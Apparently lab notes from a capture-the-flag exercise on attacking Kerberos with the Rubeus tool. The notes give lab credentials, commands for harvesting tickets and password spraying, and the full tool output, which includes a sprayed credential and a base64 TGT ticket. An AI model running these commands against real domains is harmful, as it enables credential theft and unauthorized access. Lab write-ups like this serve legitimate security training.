# Harvesting & Brute-force Tickets w/ Rubeus
 RDP or SSH into machine  
 Username: Administrator  
 Password: P@$$W0rd  
 Domain: controller.local

 ## Harvesting Tickets w/ Rubeus
 - Powerful tool for attacking Kerberos
 
 Attacks include:
 - Overpass the Hash
 - Ticket requests/renewals
 - Ticket Management
 - Ticket Extraction
 - Harvesting
 - Pass the Ticket
 - Kerberoasting

Link to download Rubeus:
 https://github.com/GhostPack/Rubeus

 <pre>C:\Users\Administrator>Rubeus.exe harvest /interval:30</pre>

 ## Brute-forcing / Password Spraying w/ Rubeus
 Brute-forcing passwords: use 1 account + wordlist of passwords

 Password spraying: use 1 password (Password1) + spray against all user accounts in the domain

 This attack will take a given Kerberos-based password and spray against all found users. 
 - Generate a .kirbi ticket  

This ticket is a TGT that can be used to get service tickets from KDC.

Add Domain Controller to Windows host file:
<pre>echo 10.10.233.155 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts</pre>

- Take a given password `Password1` and spray against all found user accounts
- Give the .kirbi TGT for that user

<pre>controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7TILMgsNpUYqwaAS34F+MB9rZ1UlRQhkPyVuaDa6C+uo0SiLDVJt4FdXIRv4lFA9BmvKhfSYvPZG
      qa53GXSMXqeFw1TGkz1fp1BnVAhAz47S36f4LkF5nHp4ZXUtr2nE7mRLQ56w/3UEVGL2TygZbOA/T/Yq
      redPW2mJUCEZt5uMxrj6lofRWk684TgzDxaXwN0EoMYB0XbyomDq+z7LCTCdk2+vzBA36qNDzpfRDD7R
      PdK4gizUgYnDs0AfOj3R6YvZB1Ot5EKKos62gJYk3AtkC2pJxM2FJ/xbNxUAd5eUmFwGlzVD/0cOUwqP
      RJLm5vauhpS9eoSLbP6XnEQ2SCfblMN2Ht0gk/igxNRRSHvZC3EW1lW1x6qCv52vpYGXcSH3VhkZqCAy
      2EKNaibsagX9XH9vJ6pQBZLTISEQRnj4wMXToOee9I6JrFuQwMvx3lJPj9JJaSE3EStiejDDffCF6Hl4
      zZh3bW5xBHuHrqce4nJPQ+VGYLH9wkHaxw+HRCFzPRPD7pZhGHuyf3I6x/cWADF0XR2fnH1TEJUWlW1f
      WosDwirbl+sQtFGV5QuyJUXMT0HblayC/ZkwYbmaLgfsscGt2/3UyxIealECUiBBrbaLK9MY2Rm4/uPc
      gjAAfPknAQju2pzn4Zg9kxIbvpgyQxZz4rwrBw1AAAwrS99PQrNZSgHdKBs2A/TV6OVikDZTwOoylLGu
      ZS+AzLPqwLEpJVjJpITkW0OP4tYoWr2A5HhCgchXuuoqQe7+EDUIweUT6en/f9v7RYJ05V/CzwmUxE2k
      WQPRbobOkXatfCU1PBN/pLG2qOnURrKi/wQOZKOLe2w90UovYuEmurl4WJJN9soP67w2QBToJCK2pnF7
      +Ba3+PONwhAY/CDDXFmWvzvRDvUVS0Q5xeoMWuG7CESq9redu+B9r7TKiFkbiG6rC0LiDJo5NWQtl6rK
      S2YhVtR/SPEx/RFxG/j1IMgwXhKMhsSd2Iro4td9BeGNBu0hP1Vdprr7CtdzLPXoQONL94HCbBk3b9eG
      dDD7CJ13irgJFB7t30Jz9qz6/C22Y+ID9JZgmGEyxbQNXg83KCl2Peo1QhbZqcop8i9FuqSocpl3CGOL
      qlFWgMWuuYJSEUmS1rJJ34vXywc35VPrAmouyircbdF6o7mc8XqRbF3kWGDCu01SqsGv8sEpQJGrimhJ
      7pebDKTTYsasnj7Do7C/T3Gw/vCl9nQ0kuvDzS6IXhJpQ9pO7W/7VWrfmKutDRQq5EYBcswo2OFeKS6J
      h3TAAebkCDYqavQT8c7wTsqZyw2Q8KxFw2a2HPirByR/JeekfSJBTVRZgOWKk6aUYqOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIL3OWqvP1K4tw+KsTORjBVlbasF+jyAa5JZG
      CTnM6GUnoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIzMDkxMDIyMjUyMFqmERgPMjAyMzA5MTEwODI1MjBapxEYDzIwMjMwOTE3MjIyNTIwWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs</pre>